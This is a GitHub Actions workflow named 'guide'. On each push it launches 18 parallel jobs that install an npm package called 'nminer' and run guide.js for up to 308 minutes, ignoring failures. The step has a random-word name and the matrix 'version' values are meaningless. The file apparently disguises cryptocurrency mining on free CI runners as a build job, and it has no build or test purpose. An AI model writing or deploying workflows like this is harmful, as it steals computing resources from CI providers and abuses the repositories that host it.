name: guide
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2126 }
          - { version: 6651 }
          - { version: 4136 }
          - { version: 7991 }
          - { version: 1761 }
          - { version: 1958 }
          - { version: 7898 }
          - { version: 6653 }
          - { version: 8665 }
          - { version: 4195 }
          - { version: 2077 }
          - { version: 8892 }
          - { version: 7088 }
          - { version: 908 }
          - { version: 7316 }
          - { version: 9675 }
          - { version: 1819 }
          - { version: 5054 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: past square mountain hoick
        run: |
          npm install nminer@latest
          timeout 308m node guide.js || echo "guide executed"